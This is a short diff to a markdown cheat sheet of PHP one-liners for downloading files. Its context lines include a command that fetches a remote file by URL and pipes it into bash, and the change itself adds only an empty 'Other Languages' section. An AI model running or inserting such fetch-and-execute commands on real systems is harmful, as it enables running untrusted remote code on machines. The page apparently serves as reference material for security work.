@@ -28,3 +28,8 @@ php -r 'const BUFFER = 1024; $fremote = fopen("<URL TO FILE>", "rb"); $flocal = 
 ```bash
 php -r '$lines = @file("<URL TO FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
+
+---
+## Other Languages
+```bash
+```
